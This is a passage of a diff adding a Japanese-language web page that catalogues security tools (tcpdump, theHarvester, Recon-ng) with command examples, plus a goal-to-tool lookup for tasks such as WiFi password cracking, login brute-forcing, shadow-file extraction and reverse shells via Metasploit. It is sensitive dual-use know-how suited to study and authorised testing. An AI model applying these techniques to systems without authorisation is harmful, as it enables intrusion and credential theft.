+      description: 'tcpdumpは、コマンドラインから動作する強力なパケットアナライザーです。ネットワークインターフェースからパケットをキャプチャし、フィルタリングして分析できます。',
+      mechanism: [
+        'libpcapを使用して生のパケットをキャプチャ',
+        'BPF（Berkeley Packet Filter）構文で柔軟なフィルタリング',
+        'リアルタイム表示とファイルへの保存が可能',
+        'Wiresharkと互換性のあるpcap形式で出力'
+      ],
+      commands: [
+        { label: 'インターフェースeth0のキャプチャ', code: 'tcpdump -i eth0' },
+        { label: '特定ホストのトラフィック', code: 'tcpdump host 192.168.1.1' },
+        { label: '特定ポートのトラフィック', code: 'tcpdump port 80' },
+        { label: 'ファイルに保存', code: 'tcpdump -w capture.pcap -i eth0' },
+        { label: 'ファイルから読み込み', code: 'tcpdump -r capture.pcap' },
+        { label: '詳細表示', code: 'tcpdump -nn -vv -i eth0' },
+        { label: '特定ネットワークのトラフィック', code: 'tcpdump net 192.168.1.0/24' }
+      ]
+    },
+    {
+      id: 'theharvester',
+      name: 'theHarvester',
+      tagline: 'OSINTサブドメイン・メール収集ツール',
+      category: 'web',
+      icon: 'Th',
+      description: 'theHarvesterは、特定のドメインに関するサブドメイン、メールアドレス、ホスト、従業員名、オープンポート、バナーを収集するOSINTツールです。',
+      mechanism: [
+        '検索エンジン（Google, Bing, Shodan, Crtsh等）から情報を収集',
+        'DNSブランチングによるサブドメイン発見',
+        '各種公開APIとの連携',
+        '結果をファイルに保存してレポート生成'
+      ],
+      commands: [
+        { label: 'ドメインからメール収集', code: 'theHarvester -d example.com -b all' },
+        { label: '特定ソースを指定', code: 'theHarvester -d example.com -b google,bing' },
+        { label: 'Shodan連携', code: 'theHarvester -d example.com -b shodan -s' },
+        { label: '結果をファイルに保存', code: 'theHarvester -d example.com -b all -f output.html' }
+      ]
+    },
+    {
+      id: 'reconng',
+      name: 'Recon-ng',
+      tagline: 'WebベースのOSINT偵察フレームワーク',
+      category: 'web',
+      icon: 'Rn',
+      description: 'Recon-ngは、Webベースのオープンソースインテリジェンス（OSINT）偵察フレームワークです。モジュール化された設計で、様々な情報源からのデータ収集を自動化します。',
+      mechanism: [
+        'モジュール化アーキテクチャ: 様々な情報源からのデータ収集モジュール',
+        'データベース統合: SQLiteデータベースに収集した情報を保存',
+        'ワークスペース機能: 異なる調査を分離して管理',
+        'マーケットプレイス: コミュニティ製モジュールを簡単にインストール'
+      ],
+      commands: [
+        { label: 'フレームワーク起動', code: 'recon-ng' },
+        { label: 'モジュール検索・インストール', code: 'marketplace search\nmarketplace install recon/domains-hosts/brute_hosts' },
+        { label: 'ワークスペース作成', code: 'workspaces create example' },
+        { label: 'ドメイン追加と実行', code: 'add domains example.com\nuse recon/domains-hosts/brute_hosts\nrun' },
+        { label: '結果表示', code: 'show hosts\nshow contacts' }
+      ]
+    }
+  ];
+
+  const reverseTasks = [
+    {
+      section: '🔍 情報収集・偵察',
+      tasks: [
+        { emoji: '🌐', title: 'ドメインのサブドメインやメールを調べたい', desc: '検索エンジンやDNSからドメインに関する情報を収集', toolId: 'theharvester' },
+        { emoji: '📡', title: 'ネットワーク上の生きているホストを見つけたい', desc: 'ICMPやARPを使ってネットワーク上の活動中のホストを発見', toolId: 'nmap' },
+        { emoji: '🚪', title: '開いているポートとサービスを調べたい', desc: 'ターゲットの開いているポートと実行中のサービスを特定', toolId: 'nmap' },
+        { emoji: '🖥️', title: 'リモートマシンのOSを特定したい', desc: 'TCP/IPスタックの実装の違いからOSを推定', toolId: 'nmap' },
+        { emoji: '🕸️', title: 'Webサイトの構造やページを自動収集したい', desc: 'Webアプリケーションを自動的にクロールしてコンテンツを発見', toolId: 'burp' },
+        { emoji: '📊', title: 'OSINT情報を体系的に収集・管理したい', desc: 'モジュール化されたフレームワークで多様な情報源からデータ収集', toolId: 'reconng' }
+      ]
+    },
+    {
+      section: '🌐 Webアプリケーション',
+      tasks: [
+        { emoji: '💉', title: 'WebサイトにSQLインジェクションがあるか調べたい', desc: '自動的にSQLインジェクション脆弱性を検出・悪用', toolId: 'sqlmap' },
+        { emoji: '🔓', title: 'Webサイトのログインフォームをブルートフォースしたい', desc: 'HTTPフォームに対してユーザー名とパスワードの辞書攻撃', toolId: 'hydra' },
+        { emoji: '📋', title: 'Webサーバーの既知の脆弱性をスキャンしたい', desc: 'WebサーバーとCGIに対して既知の脆弱性チェックを実行', toolId: 'nikto' },
+        { emoji: '🔍', title: 'HTTPリクエスト/レスポンスを傍受・改変したい', desc: 'ブラウザとサーバー間の通信をプロキシ経由で傍受・改変', toolId: 'burp' },
+        { emoji: '🎯', title: 'Webアプリのパラメータをファジングしたい', desc: '自動化されたカスタマイズ可能な攻撃でパラメータをテスト', toolId: 'burp' }
+      ]
+    },
+    {
+      section: '📡 ネットワーク',
+      tasks: [
+        { emoji: '📦', title: 'ネットワークトラフィックをキャプチャしたい', desc: '生のパケットをリアルタイムでキャプチャ・分析', toolId: 'wireshark' },
+        { emoji: '🔎', title: 'キャプチャしたパケットを詳しく分析したい', desc: '数百のプロトコルに対応したパーサーでパケットを階層的に解析', toolId: 'wireshark' },
+        { emoji: '📡', title: 'コマンドラインでパケットをキャプチャしたい', desc: 'ヘッドレス環境やスクリプトからパケットをキャプチャ', toolId: 'tcpdump' },
+        { emoji: '🛡️', title: 'ネットワーク上の脆弱性を自動スキャンしたい', desc: 'NSEスクリプトでネットワーク上の既知の脆弱性を検出', toolId: 'nmap' }
+      ]
+    },
+    {
+      section: '📶 無線・WiFi',
+      tasks: [
+        { emoji: '🔑', title: 'WiFiのWPA/WPA2パスワードをクラックしたい', desc: '4-wayハンドシェイクをキャプチャして辞書攻撃', toolId: 'aircrack' },
+        { emoji: '📻', title: '周囲のWiFiネットワークを調査したい', desc: 'モニターモードで周囲のAPとクライアントを発見', toolId: 'aircrack' },
+        { emoji: '📡', title: 'WiFiパケットをキャプチャしたい', desc: 'モニターモードで無線パケットをキャプチャ', toolId: 'aircrack' }
+      ]
+    },
+    {
+      section: '🔐 認証・パスワード',
+      tasks: [
+        { emoji: '🔑', title: 'パスワードハッシュをクラックしたい', desc: '辞書攻撃・ブルートフォース・ルール適用でハッシュを解読', toolId: 'john' },
+        { emoji: '⚡', title: 'パスワードハッシュをGPUで高速クラックしたい', desc: 'GPUアクセラレーションを活用した高速ハッシュクラッキング', toolId: 'hashcat' },
+        { emoji: '🔓', title: 'SSH/FTP/MySQLなどのログインをブルートフォースしたい', desc: '多数のプロトコルに対して並列ログイン試行', toolId: 'hydra' },
+        { emoji: '📁', title: 'Linuxの/etc/shadowからパスワードを抽出したい', desc: 'passwdとshadowを結合してパスワードクラック用に準備', toolId: 'john' }
+      ]
+    },
+    {
+      section: '💥 エクスプロイト・攻撃',
+      tasks: [
+        { emoji: '🎯', title: '既知の脆弱性を悪用して侵入したい', desc: '既知の脆弱性に対するエクスプロイトコードを検索・実行', toolId: 'metasploit' },
+        { emoji: '🐚', title: 'ターゲットにリバースシェルを取得したい', desc: 'ペイロードを生成してターゲット上でシェルを取得', toolId: 'metasploit' },
+        { emoji: '📡', title: 'SMBなどのサービスをスキャンしたい', desc: '補助モジュールでサービスのバージョンや設定を確認', toolId: 'metasploit' },
+        { emoji: '🦠', title: '悪意あるペイロードを生成したい', desc: '様々な形式のペイロードをカスタマイズして生成', toolId: 'metasploit' }
+      ]
+    }
+  ];
+
+  let currentCategory = 'all';
+  let searchQuery = '';
+  let reverseQuery = '';
+
+  function renderTools() {
+    const grid = document.getElementById('toolsGrid');
+    const filtered = tools.filter(t => {
+      const matchCat = currentCategory === 'all' || t.category === currentCategory;
+      const q = searchQuery.toLowerCase();
+      const matchSearch = !q || 
+        t.name.toLowerCase().includes(q) ||
+        t.tagline.toLowerCase().includes(q) ||
+        t.description.toLowerCase().includes(q) ||
+        t.commands.some(c => c.code.toLowerCase().includes(q) || c.label.toLowerCase().includes(q));
+      return matchCat && matchSearch;
+    });
+
+    if (filtered.length === 0) {
+      grid.innerHTML = '<div class="no-results">🔍 該当するツールが見つかりませんでした</div>';
+      return;
+    }
+
+    grid.innerHTML = filtered.map(tool => `
+      <div class="tool-card" data-id="${tool.id}">
+        <div class="tool-header" onclick="toggleCard('${tool.id}')">
+          <div class="tool-icon">${tool.icon}</div>
+          <div class="tool-info">
+            <h3>${tool.name}</h3>
+            <div class="tagline">${tool.tagline}</div>
+          </div>
+          <div class="tool-meta">
+            <span class="tool-tag ${tool.category}">${getCategoryLabel(tool.category)}</span>
+            <span class="expand-icon">▼</span>
+          </div>
+        </div>
+        <div class="tool-body">
+          <div class="tool-content">
+            <div class="section">
+              <div class="section-title">概要</div>
+              <p class="desc-text">${tool.description}</p>
+            </div>
+            <div class="section">
+              <div class="section-title">仕組み</div>
+              <ul class="mechanism-list">
+                ${tool.mechanism.map(m => `<li>${m}</li>`).join('')}
+              </ul>
+            </div>
+            <div class="section">
+              <div class="section-title">コマンド例</div>
+              ${tool.commands.map((cmd, idx) => `
+                <div class="code-block">
+                  <div class="code-header">
+                    <span class="code-label">${cmd.label}</span>
+                    <button class="copy-btn" onclick="copyCode(this, '${tool.id}_${idx}')">
+                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                      コピー
+                    </button>
+                  </div>
+                  <pre id="code_${tool.id}_${idx}">${escapeHtml(cmd.code)}</pre>
+                </div>
+              `).join('')}
+            </div>
+          </div>
+        </div>
+      </div>
+    `).join('');
+  }
+
+  function renderReverse() {
+    const container = document.getElementById('reverseContent');
+    const q = reverseQuery.toLowerCase();
+
+    let html = '';
+    reverseTasks.forEach(section => {
+      const filtered = section.tasks.filter(t =>
+        !q || t.title.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q)
+      );
+      if (filtered.length === 0) return;
+
+      html += `<div class="section-header">${section.section}</div>`;
+      html += '<div class="reverse-grid">';
+      filtered.forEach(task => {
+        const tool = tools.find(t => t.id === task.toolId);
+        html += `
+          <div class="reverse-card">
+            <div class="task-title"><span class="emoji">${task.emoji}</span>${task.title}</div>
+            <div class="task-desc">${task.desc}</div>
+            <div class="tool-link" onclick="goToTool('${task.toolId}')">
+              <div class="link-icon">${tool.icon}</div>
+              <div class="link-info">
+                <div class="link-name">${tool.name}</div>
+                <div class="link-desc">${tool.tagline}</div>
+              </div>
+              <div class="link-arrow">→</div>
+            </div>
+          </div>
+        `;
+      });
+      html += '</div>';
+    });
+
+    if (!html) {
+      html = '<div class="no-results">🔍 該当するタスクが見つかりませんでした</div>';
+    }
+
+    container.innerHTML = html;
+  }
+
+  function goToTool(toolId) {
+    // Switch to tools tab
+    document.querySelectorAll('.main-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    document.querySelector('[data-tab="tools"]').classList.add('active');
+    document.getElementById('tab-tools').classList.add('active');
+
+    // Reset filters
+    currentCategory = 'all';
+    searchQuery = '';
+    document.getElementById('searchInput').value = '';
+    document.querySelectorAll('.category-tab').forEach(t => t.classList.remove('active'));
+    document.querySelector('[data-cat="all"]').classList.add('active');
+
+    renderTools();
+
+    // Expand the target card
+    setTimeout(() => {
+      const card = document.querySelector(`[data-id="${toolId}"]`);
+      if (card) {
+        card.classList.add('expanded');
+        card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    }, 100);
+  }
+
+  function getCategoryLabel(cat) {
+    const labels = {
+      network: 'ネットワーク',
+      web: 'Web',
+      wireless: '無線',
+      crypto: '暗号/認証',
+      exploit: 'エクスプロイト',
+      forensics: 'フォレンジック'
+    };
+    return labels[cat] || cat;
+  }
+
+  function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+  }
+
+  function toggleCard(id) {
+    const card = document.querySelector(`[data-id="${id}"]`);
+    card.classList.toggle('expanded');
+  }
+
+  function copyCode(btn, codeId) {
+    const pre = document.getElementById('code_' + codeId);
+    const text = pre.textContent;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.classList.add('copied');
+      btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg> コピー済';
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> コピー';
+      }, 2000);
+    });
+  }
+
+  // Main tabs
+  document.getElementById('mainTabs').addEventListener('click', e => {
+    if (e.target.classList.contains('main-tab')) {
+      document.querySelectorAll('.main-tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+      e.target.classList.add('active');
+      document.getElementById('tab-' + e.target.dataset.tab).classList.add('active');
+    }
+  });
+
+  // Category tabs
+  document.getElementById('categoryTabs').addEventListener('click', e => {
+    if (e.target.classList.contains('category-tab')) {
+      document.querySelectorAll('.category-tab').forEach(t => t.classList.remove('active'));
+      e.target.classList.add('active');
+      currentCategory = e.target.dataset.cat;
+      renderTools();
+    }
+  });
+
+  // Search
+  document.getElementById('searchInput').addEventListener('input', e => {
+    searchQuery = e.target.value;
+    renderTools();
+  });
+
+  // Reverse search
+  document.getElementById('reverseSearch').addEventListener('input', e => {
+    reverseQuery = e.target.value;
+    renderReverse();
+  });
+
+  // Initial render
+  renderTools();
+  renderReverse();
+</script>
+
+</body>
+</html>
